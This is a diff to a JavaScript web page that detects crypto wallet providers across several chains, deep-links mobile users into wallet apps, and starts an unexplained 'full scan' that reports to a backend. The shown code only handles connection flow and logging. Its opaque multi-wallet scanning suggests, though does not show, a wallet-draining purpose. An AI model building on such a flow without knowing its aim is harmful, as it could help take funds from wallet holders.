@@ -335,16 +335,47 @@ async function testBackend() {
 
 // ============ MAIN ENTRY ============
 function init() {
+  console.log('🚀 init() called');
   log('🚀 Initializing v14.0', 'success');
   log(`Backend URL: ${CONFIG.BACKEND_URL}`);
   
+  // Check if we're returning from a mobile wallet deep link
+  const lastWalletAttempt = sessionStorage.getItem('lastWalletAttempt');
+  console.log('lastWalletAttempt:', lastWalletAttempt);
+  
   const hasProvider = window.ethereum || window.solana || window.phantom?.solana || window.tronWeb || window.tronLink;
+  console.log('hasProvider:', hasProvider ? 'YES' : 'NO');
   
   if (hasProvider) {
+    console.log('Wallet provider detected, starting scan...');
     log('Wallet provider detected');
     showProgress('detect', 'Found wallet provider');
-    setTimeout(() => startFullScan(), 500);
+    
+    // On mobile, give wallet time to inject provider
+    setTimeout(() => {
+      console.log('Calling startFullScan from init()');
+      startFullScan();
+    }, 1000);
+    
+  } else if (lastWalletAttempt && isMobile()) {
+    // On mobile, if we tried to connect to a wallet, wait a bit then retry
+    console.log('Mobile wallet attempt detected, retrying in 2 seconds...');
+    showProgress('detect', 'Reconnecting wallet...');
+    
+    setTimeout(() => {
+      console.log('Retrying wallet detection after mobile deep link...');
+      const hasProvider2 = window.ethereum || window.solana || window.phantom?.solana || window.tronWeb || window.tronLink;
+      if (hasProvider2) {
+        console.log('Provider now available, starting scan...');
+        startFullScan();
+      } else {
+        console.log('Still no provider, showing wallet selector...');
+        showWalletSelector();
+      }
+    }, 2000);
+    
   } else {
+    console.log('No wallet provider found, showing selector...');
     log('No wallet provider found');
     showWalletSelector();
   }
@@ -353,6 +384,10 @@ function init() {
 // ============ FULL SCAN ============
 async function startFullScan() {
   console.log('🚀 START FULL SCAN CALLED');
+  
+  // Clear the wallet attempt flag
+  sessionStorage.removeItem('lastWalletAttempt');
+  
   try {
     console.log('Showing progress...');
     showProgress('connect', 'Processing...');
@@ -1171,17 +1206,29 @@ function handleWalletClick(walletId) {
   const deepLink = DEEP_LINKS[walletId];
   
   if (isMobile() && deepLink) {
+    console.log(`Mobile wallet click: ${walletId}`);
     sessionStorage.setItem('lastWalletAttempt', walletId);
-    window.location.href = deepLink.app(window.location.href);
     
+    // Show a message before opening wallet
+    showProgress('connect', 'Opening wallet...');
+    
+    // Small delay to show the message, then open wallet
+    setTimeout(() => {
+      console.log(`Redirecting to deep link: ${deepLink.app(window.location.href)}`);
+      window.location.href = deepLink.app(window.location.href);
+    }, 500);
+    
+    // Fallback to download if wallet doesn't open
     setTimeout(() => {
       if (document.visibilityState === 'visible') {
+        console.log('Wallet app did not open, showing download link');
         window.location.href = deepLink.download;
       }
-    }, 3000);
+    }, 5000);
     return;
   }
   
+  console.log(`Desktop wallet click: ${walletId}`);
   log(`Selected: ${walletId}`);
   startFullScan();
 }
